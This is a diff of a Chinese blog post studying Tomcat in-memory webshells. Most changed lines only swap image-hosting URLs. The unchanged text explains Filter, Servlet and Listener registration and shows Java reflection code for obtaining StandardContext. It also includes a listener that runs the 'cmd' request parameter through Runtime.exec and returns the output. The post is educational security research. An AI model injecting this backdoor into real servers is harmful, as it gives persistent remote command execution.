@@ -27,47 +27,47 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="tomcat内存马原理学习记录">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417185013757.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418151626862.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418152549816.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153140872.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153636868.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418154301503.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418155818702.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418160009434.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420112130648.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418232736182.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418233017639.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220419132233195.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101423176.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420102024626.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101210413.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121651249.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121832745.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421144335949.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420180444920.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420182450812.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121557998.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121642666.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420122055271.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140012800.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140848773.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172150621.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172202365.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172536815.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173023450.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173256592.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171315008.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171440443.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417184815764.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417185013757.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418151626862.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418152549816.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153140872.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153636868.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418154301503.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418155818702.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418160009434.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420112130648.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418232736182.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418233017639.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220419132233195.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101423176.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420102024626.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101210413.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121651249.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121832745.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421144335949.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420180444920.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420182450812.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121557998.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121642666.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420122055271.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140012800.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140848773.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172150621.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172202365.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172536815.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173023450.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173256592.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171315008.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171440443.png">
 <meta property="article:published_time" content="2022-04-17T08:26:54.000Z">
-<meta property="article:modified_time" content="2022-04-23T15:42:00.583Z">
+<meta property="article:modified_time" content="2024-09-28T14:07:42.655Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="java">
 <meta property="article:tag" content="memshell">
 <meta property="article:tag" content="filter">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png">
+<meta name="twitter:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417184815764.png">
 
 <link rel="canonical" href="http://example.com/2022/04/17/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
 
@@ -258,7 +258,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-23 23:42:00" itemprop="dateModified" datetime="2022-04-23T23:42:00+08:00">2022-04-23</time>
+                <time title="修改时间：2024-09-28 22:07:42" itemprop="dateModified" datetime="2024-09-28T22:07:42+08:00">2024-09-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -328,9 +328,9 @@
 <p>接下来跟进到代码,跟进filter的代码流程</p>
 </blockquote>
 <p>首先进入doFilter方法中,会直接进入<code>internalDoFilter()</code>方法中,这个才是Tomcat中真正实现过滤的类</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png" alt="image-20220417184815764"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417184815764.png" alt="image-20220417184815764"></p>
 <p>当到最后一个Filter,就会调用对应servlet的service方法</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417185013757.png" alt="image-20220417185013757"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417185013757.png" alt="image-20220417185013757"></p>
 <p>总而言之,所有Filter就是一条独木桥上面的木板,少了哪一块都会导致后面的Filter的doFilter方法调用不到从而导致调用不到对应Servlet的service方法</p>
 <p>在tomcat的组成中,一部分为服务器用于与外界交流,一部分是容器,里面运行的就是servlet,filter….</p>
 <h5 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h5><p>Tomcat将http请求文本接收并解析,然后封装成HttpServletResquest类型的request对象,</p>
@@ -352,31 +352,31 @@
 <p>存放FilterDef的数组,,FilterDef中存放这过滤器名,过滤器实例,作用url等基本信息,(调试的时候没找到作用url的成员变量)</p>
 <p>FilterConfigs:存放FilterConfig的数组,FilterConfig主要存放FilterDef和Filter对象等信息</p>
 <p>FilterMaps:存放FilterMap数组,在FilterMap中主要存放了FilterName和对应的URLPattern    </p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />
 
 <p>FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter</p>
 <p>StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)</p>
 <p>StandardWrapperValve: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
 <p>在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />
 
 <p>在<code>ApplicationFilterFactory</code>中的createFilterChain方法中,首先通过getParent获取当前wrapper的爹,也就是Context,然后获取到当前context中的所有filterMap,我自己写的是testFilter1和testFilter2两个</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />
 
 <p>接下来</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />
 
 <p>会对FilterMap进行遍历,如果当前请求中的url与遍历中的filterMap相对应,则把filterMap对应的FilterConfig添加到filterChain中去</p>
 <p>添加完成后会调用doFilter方法</p>
 <p>doFilter方法会调用internalDoFilter方法,该方法会依次从filters中取出filterConfig,调用filter的doFilter方法,从而调用到过滤器中重写的doFilter方法,触发自定义的代码</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />
 
 
 
 <p>要想实现动态添加filter,首先要获取到context,因为根据前面的分析,filterMaps是通过context获取到的</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418155818702.png" alt="image-20220418155818702"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418155818702.png" alt="image-20220418155818702"></p>
 <p>按照大佬的方法,首先web容器启动的时候会为每个web应用创建一个ServletContext对象,代表当前应用,而有一个类很特殊,就是<code>ApplicationContext</code>类,它是ServletContext的实现类,并且它的成员变量中包含了<code>context</code>的标准实现类<code>StandardContext</code></p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />
 
 <p>可以通过反射来获取到它的这个成员变量,即为当前的context,然后就可以添加filterMaps,进行一系列操作了</p>
 <p>获取到context后,就可以进行动态注入filter了,但是注入之前要明确注入的参数,注入内存马实际上是在模拟写xml文件的过程</p>
@@ -390,11 +390,11 @@
 <p>存放了FilterConfig数组,在FilterConfig中主要存放FilterDef和Filter对象的信息,调用的时候就是从这里面获取的filter</p>
 <p>这里不得不提到一点,就是getClass方法得到的其实是能代表当前对象真正运行的类(Class)的对象</p>
 <p>翻译的有点奇怪….,反正就是注意声明类型和实际类型的问题</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420112130648.png" alt="image-20220420112130648"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420112130648.png" alt="image-20220420112130648"></p>
 <p>ServletContext接口当前正在运行的对象所对应的类就是ApplicationContextFacade</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418232736182.png" alt="image-20220418232736182"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418232736182.png" alt="image-20220418232736182"></p>
 <p>而这个类中的Context的类型是ApplicationContext</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418233017639.png" alt="image-20220418233017639"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418233017639.png" alt="image-20220418233017639"></p>
 <p><code>ApplicationContext</code>中有<code>StandardContext</code>类型的成员变量<code>context</code>,通过这样就能获取到对应的<code>context</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">//这里获取到的class是ApplicationContextFacade</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">        // standardContext为context接口标准实现类</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
 
@@ -418,7 +418,7 @@
 
 
 
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220419132233195.png" alt="image-20220419132233195" style="zoom:67%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220419132233195.png" alt="image-20220419132233195" style="zoom:67%;" />
 
 <p>最后是filterConfig这个东西了</p>
 <p>filterConfig是一个接口,真正运行的它的类是ApplicationFilterConfig,所以需要新建一个ApplicationFilterConfig对象,添加到当前正在运行的context的filterConfigs中去(注意这里是复数)</p>
@@ -446,34 +446,34 @@
 <h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>除了上面那种方法,还在看大佬博客的时候发现了一个方法,这个方法很巧妙</p>
 <p>首先</p>
 <p>在jsp中可以直接写的request对象的类型是HttpServletRequest,HttpServletRequest是一个接口,通过它,getClass(),获取到当前正在运行的它的对应对象的类是RequestFacade</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101423176.png" alt="image-20220420101423176"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101423176.png" alt="image-20220420101423176"></p>
 <p>RequestFacade中有一个成员变量Request</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420102024626.png" alt="image-20220420102024626"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420102024626.png" alt="image-20220420102024626"></p>
 <p>通过该Request中的getContext()方法可以获取到当前request对应的context</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420101210413.png" alt="image-20220420101210413"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101210413.png" alt="image-20220420101210413"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request request1 = (Request)declaredField.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
 
 <h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>通过ThreadLocal获取context</p>
 <p>ThreadLocal是什么呢,顾名思义,就是它里面存的是当前线程才才可以访问和使用的一些变量,当然想用他里面的变量,也得先存进去不是</p>
 <p>看大佬说的是因为在internalDoFilter方法调用中，将request赋值给了ThreadLocal。所以可以获取到request从而像方法二一样获取到context对象,但是这里就出现了一个令我有点不解的点,就是Filter的添加是在internalDoFilter之后,为什么可以在添加Filter之前就获取到ThreadLocal这个对象呢</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121651249.png" alt="image-20220421121651249" style="zoom:67%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121651249.png" alt="image-20220421121651249" style="zoom:67%;" />
 
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421121832745.png" alt="image-20220421121832745"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121832745.png" alt="image-20220421121832745"></p>
 <p>当ApplicationDispatcher.WRAP_SAME_OBJECT这个变量为true的时候,就会创建新的ThreadLocal并且将request对象放进去,这个值默认为false,所以通过反射修改一下</p>
 <p>这个方法学习的推进遇见了麻烦,完事补上…….</p>
 <h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p>通过<code>ContextClassLoader</code>获取<code>standardContext</code></p>
 <p>ContextClassLoader实际上是一个虚的概念,它的本质还是ClassLoader,只是它破坏了双亲委托机制,让子类加载器可以加载父类加载器才能加载的内容</p>
 <p>tomcat的类加载机制和双亲委派机制是相反它,它是先用webappClassLoader去尝试加载某个类,找不到再交给父类加载器去加载</p>
 <p>webappClassLoader显然就是这样一个ContextClassLoader</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220421144335949.png" alt="image-20220421144335949"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421144335949.png" alt="image-20220421144335949"></p>
 <p>采用<code>Thread.currentThread().getContextClassLoader()</code>获取到的CLassLoader是ParalleWebappClassLoader,它是<code>WebappClassLoaderBase</code>的子类,由于contextClassLoader的特性,它可以加载<code>WebappClassLoaderBase</code>的内容</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
 
 <h4 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h4><p>通过Thread获取context</p>
 <p>跟着这篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e2774aa3e9ba">文章</a>学习,大概找context的路径是酱紫的</p>
 <p>threads[16]-&gt;target-&gt;endpoint-&gt;handler-&gt;proto-&gt;adapter-&gt;connector-&gt;service-&gt;engine-&gt;children(map)-&gt;map(“localhost”)-&gt;StandardEngine-&gt;children(map)-&gt;map(‘’)-&gt;standardContext</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420180444920.png" alt="image-20220420180444920"></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420182450812.png" alt="image-20220420182450812"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420180444920.png" alt="image-20220420180444920"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420182450812.png" alt="image-20220420182450812"></p>
 <p>总之知道在哪里可以获取到context后过程其实并不难,主要的是细心一层层往下慢慢剥开,还有个问题就是说有的成员变量是在父类中的,需要多次<code>getSuperclass()</code></p>
 <p>通过这种方式实现的Filter内存马</p>
 <blockquote>
@@ -490,11 +490,11 @@
 <h2 id="servlet类型的内存马"><a href="#servlet类型的内存马" class="headerlink" title="servlet类型的内存马"></a>servlet类型的内存马</h2><p>首先,跟进一些servlet的添加注册流程</p>
 <p>首先在ContextConfig#webConfig()中读取xml文件信息</p>
 <p>使用context#createWrapper新建一个wrapper对象,设置启动优先级,servlet的name,设置了servlet的Class</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121557998.png" alt="image-20220420121557998"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121557998.png" alt="image-20220420121557998"></p>
 <p>并且通过addChild将其添加到context当中,</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420121642666.png" alt="image-20220420121642666"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121642666.png" alt="image-20220420121642666"></p>
 <p>然后循环遍历servletmapping添加路径和name的对应关系</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420122055271.png" alt="image-20220420122055271"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420122055271.png" alt="image-20220420122055271"></p>
 <p>其实大体流程和之前的filter差不多</p>
 <p>还变得简单了,原因呢就是wrapper和servlet是一一对应的关系</p>
 <p>总共分为以下几步</p>
@@ -507,10 +507,10 @@
 <p>访问对应的jsp让其完成动态注入,接着就可以在对应路径执行命令了</p>
 <h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>在Tomcat中,自定义了很多继承于EventListener接口的对象,应用于各个对象的监听</p>
 <p>在继承了这个接口的对象中,有一个ServletRequestListener,它用于监听ServletRequest的生成和销毁,也就是说,只要访问该网站资源,就会触发requestInitialized方法</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140012800.png" alt="image-20220420140012800" style="zoom: 50%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140012800.png" alt="image-20220420140012800" style="zoom: 50%;" />
 
 <p>在<code>StandardContext#fireRequestInitEvent</code>方法中,进行了对listener中初始化方法的调用</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140848773.png" alt="image-20220420140848773"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140848773.png" alt="image-20220420140848773"></p>
 <p>综上所述,只需要创建一个<code>ServletRequestListener</code>并且将其添加到<code>StandardContext</code>中的<code>ApplicationEventListeners</code>就行了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ServletRequestListener servletRequestListener = <span class="keyword">new</span> ServletRequestListener()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                result.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            result.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + result.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Request request1 = (Request)declaredField.get(request);</span><br><span class="line">StandardContext standardContext=(StandardContext) request1.getContext();</span><br><span class="line"></span><br><span 